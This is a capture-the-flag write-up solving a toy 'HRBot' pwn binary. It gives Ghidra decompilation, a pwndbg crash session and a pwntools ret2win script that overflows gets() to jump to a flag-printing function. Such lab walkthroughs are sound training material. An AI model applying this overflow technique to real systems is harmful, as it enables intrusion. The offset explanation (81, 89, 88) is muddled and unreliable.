## Binray my friend dropped in chat didn't bother askin form where it came but its interesting..

[download: binary](https://github.com/TheGreenOfficial/pwn-archive/blob/main/pwn-archive/binaries/hrbot)

*first look*

```
skid@TheGreen:~/ctfs/old/pwn/hrbot$ ./hrbot
=== HRBot v2.4 ===
Your automated Human Resources companion.
All cases are handled with maximum efficiency and zero empathy.

[+] HRBot: Debugging mode activated. Debugging messages denoted by '[+]'.

1. Report a workplace concern
2. Request compensation realignment
3. Request time off
4. Submit resignation
5. Appeal a previous termination
>
```

*decompiled view in ghidra*

```
====================================================================================================
FUNCTION: win_func
ADDRESS : 00401256
====================================================================================================
void win_func(void)
{
  char local_98 [136];
  FILE *local_10;
  
  local_10 = fopen("flag.txt","r");
  if (local_10 == (FILE *)0x0) {
    puts("HRBot: flag.txt not found. Please open a ticket with IT.");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  fgets(local_98,0x80,local_10);
  fclose(local_10);
  puts("\n[+] HRBot: EXCEPTION DETECTED - unauthorized severance package approved.");
  puts("[+] HRBot: Please accept this generous parting gift:");
  printf("FLAG: %s\n",local_98);
  return;
}
====================================================================================================
FUNCTION: fire_employee
ADDRESS : 00401305
====================================================================================================
void fire_employee(undefined8 param_1)
{
  printf("HRBot: %s\n",param_1);
  puts("HRBot: Severance package: DENIED.");
  puts("HRBot: Badge, laptop, and soul must be surrendered by EOD.");
  return;
}
====================================================================================================
FUNCTION: handle_case
ADDRESS : 00401351
====================================================================================================
void handle_case(void)
{
  ulong unaff_retaddr;
  char local_58 [64];
  ulong local_18;
  ulong local_10;
  
  saved_rip_ptr = (ulong *)register0x00000020;
  local_10 = unaff_retaddr;
  printf("\n[+] HRBot: Your unique case ID: 0x%lx\n",unaff_retaddr);
  puts("\nHRBot: Please describe your HR case. For efficiency, input is limited to 64 characters.");
  gets(local_58);
  local_18 = *saved_rip_ptr;
  if (local_18 == local_10) {
    puts(
        "\n[+] HRBot: EXCEPTION - COMPASSION DETECTED - You might need to overwrite some kind of address?"
        );
  }
  else if ((local_18 < 0x400000) || (0x4fffff < local_18)) {
    printf("\n[+] HRBot: Your case ID changed to 0x%lx.\n",local_18);
    puts("\n[+] HRBot: perhaps you\'re still working out the correct amount of padding?");
  }
  else {
    printf("\n[+] HRBot: You must be a smart employee, the case ID has changed!");
    printf("\n[+] HRBot: New case ID: 0x%lx\n",local_18);
  }
  puts("\nHRBot: Case logged. A representative will never contact you.");
  fire_employee("Your case has been escalated directly to termination.");
  return;
}
====================================================================================================
FUNCTION: print_menu
ADDRESS : 0040146a
====================================================================================================
void print_menu(void)
{
  puts("=== HRBot v2.4 ===");
  puts("Your automated Human Resources companion.");
  puts("All cases are handled with maximum efficiency and zero empathy.\n");
  puts("[+] HRBot: Debugging mode activated. Debugging messages denoted by \'[+]\'.\n");
  puts("1. Report a workplace concern");
  puts("2. Request compensation realignment");
  puts("3. Request time off");
  puts("4. Submit resignation");
  puts("5. Appeal a previous termination");
  printf("> ");
  return;
}
====================================================================================================
FUNCTION: main
ADDRESS : 00401510
====================================================================================================
undefined8 main(void)
{
  undefined4 local_c;
  
  setbuf(stdin,(char *)0x0);
  setbuf(stdout,(char *)0x0);
  print_menu();
  __isoc99_scanf(&DAT_0040251c,&local_c);
  getchar();
  switch(local_c) {
  default:
    fire_employee("Invalid selection. Termination expedited.");
    break;
  case 1:
    handle_case();
    break;
  case 2:
    fire_employee("Compensation realignment request denied.");
    break;
  case 3:
    fire_employee("Work-life balance is not aligned with company values.");
    break;
  case 4:
    fire_employee(
                 "Resignation not accepted. Resignation is not aligned with company values. Termination expedited."
                 );
    break;
  case 5:
    fire_employee("All rights to appeal was waived at initial employment.");
  }
  puts("\nThank you for using HRBot. Have a productive unemployment.");
  return 0;
}
```

*Finding offeset and making exploit..*

```
skid@TheGreen:~/ctfs/old/pwn/hrbot$ ls
e.py  hrbot  hrbot.ghidra-out
skid@TheGreen:~/ctfs/old/pwn/hrbot$ gdb ./hrbot
GNU gdb (Debian 17.2-1+b1) 17.2
Copyright (C) 2025 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
pwndbg: loaded 200 pwndbg commands. Type pwndbg [filter] for a list.
pwndbg: created 12 GDB functions (can be used with print/break). Type help function to see them.
Reading symbols from ./hrbot...
(No debugging symbols found in ./hrbot)
------- tip of the day (disable with set show-tips off) -------
Want to display each context panel in a separate tmux window? See https://pwndbg.re/stable/tutorials/splitting-the-context/
pwndbg> r < <(printf 1; pwn cyclic 200)
Starting program: /home/skid/ctfs/old/pwn/hrbot/hrbot < <(printf 1; pwn cyclic 200)
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/usr/lib/x86_64-linux-gnu/libthread_db.so.1".
=== HRBot v2.4 ===
Your automated Human Resources companion.
All cases are handled with maximum efficiency and zero empathy.

[+] HRBot: Debugging mode activated. Debugging messages denoted by '[+]'.

1. Report a workplace concern
2. Request compensation realignment
3. Request time off
4. Submit resignation
5. Appeal a previous termination
>
[+] HRBot: Your unique case ID: 0x40159e

HRBot: Please describe your HR case. For efficiency, input is limited to 64 characters.

[+] HRBot: Your case ID changed to 0x7961616178616161.

[+] HRBot: perhaps you're still working out the correct amount of padding?

HRBot: Case logged. A representative will never contact you.
HRBot: Badge, laptop, and soul must be surrendered by EOD.

Program received signal SIGSEGV, Segmentation fault.
0x0000000000401469 in handle_case ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────
 RAX  0x3b
 RBX  0
 RCX  0x7ffff7f9f750 (_IO_stdfile_1_lock) ◂— 0
 RDX  0x7ffff7f9f750 (_IO_stdfile_1_lock) ◂— 0
 RDI  0
 RSI  0x7ffff7f9e603 (_IO_2_1_stdout_+131) ◂— 0xf9f750000000000a /* '\n' */
 R8   0
 R9   0
 R10  0
 R11  0x202
 R12  1
 R13  0x7ffff7ffd000 (_rtld_global) —▸ 0x7ffff7ffe2e0 ◂— 0
 R14  0x7fffffffdde8 —▸ 0x7fffffffe0cb ◂— 'SHELL=/bin/bash'
 R15  0x403e00 (__do_global_dtors_aux_fini_array_entry) —▸ 0x401220 (__do_global_dtors_aux) ◂— endbr64
 RBP  0x7761616176616161 ('aaavaaaw')
 RSP  0x7fffffffdc98 ◂— 'aaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
 RIP  0x401469 (handle_case+280) ◂— ret
─────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────
 ► 0x401469 <handle_case+280>    ret                                <0x7961616178616161>
    ↓









───────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────
00:0000│ rsp 0x7fffffffdc98 ◂— 'aaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
01:0008│     0x7fffffffdca0 ◂— 'aaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
02:0010│     0x7fffffffdca8 ◂— 'aabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
03:0018│     0x7fffffffdcb0 ◂— 'aabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
04:0020│     0x7fffffffdcb8 ◂— 'aabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
05:0028│     0x7fffffffdcc0 ◂— 'aabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
06:0030│     0x7fffffffdcc8 ◂— 'aabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
07:0038│     0x7fffffffdcd0 ◂— 'aabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
─────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────
 ► 0 0x401469           handle_case+280
   1 0x7961616178616161
   2 0x626261617a616161
   3 0x6462616163626161
   4 0x6662616165626161
   5 0x6862616167626161
   6 0x6a62616169626161
   7 0x6c6261616b626161
────────────────────────────────────────────[ LAST SIGNAL ]────────────────────────────────────────────
Program received signal SIGSEGV (fault address: 0x0).
───────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> quit
skid@TheGreen:~/ctfs/old/pwn/hrbot$ pwn cyclic -l aaavaaaw
81
```

*So, our offeset is 89 but when coading we wrote 88 why? notice the getchar() in there that eats one byte. I didn't saw that and got stuck for a while thinking did gdb got tricked or its trippin wtf bruh like that lol..*

```
#!/usr/bin/env python3
import sys
from pwn import *

if len(sys.argv) == 3:
    ip = sys.argv[1]
    port = int(sys.argv[2])
    print(f"[*] Connecting to remote target -> {ip}:{port}")
    p = remote(ip, port)
else:
    print("[*] Running local binary process...")
    p = process('./hrbot')

p.recvuntil(b'> ')
p.sendline(b'1')

p.recvuntil(b'characters.')
p.recvline()
payload = b'A' * 88
payload += p64(0x00401256)

p.sendline(payload)

p.interactive()
```

*running exploit to get flag..*

```
skid@TheGreen:~/ctfs/old/pwn/hrbot$ python3 e.py
[*] Running local binary process...
[+] Starting local process './hrbot': pid 1302
[*] Switching to interactive mode

[+] HRBot: You must be a smart employee, the case ID has changed!
[+] HRBot: New case ID: 0x401256

HRBot: Case logged. A representative will never contact you.
HRBot: Your case has been escalated directly to termination.
HRBot: Severance package: DENIED.
HRBot: Badge, laptop, and soul must be surrendered by EOD.

[+] HRBot: EXCEPTION DETECTED - unauthorized severance package approved.
[+] HRBot: Please accept this generous parting gift:
FLAG: flag{y0u_pWned_hrb0t}

[*] Got EOF while reading in interactive
$ exit
[*] Process './hrbot' stopped with exit code -11 (SIGSEGV) (pid 1302)
[*] Got EOF while sending in interactive
```
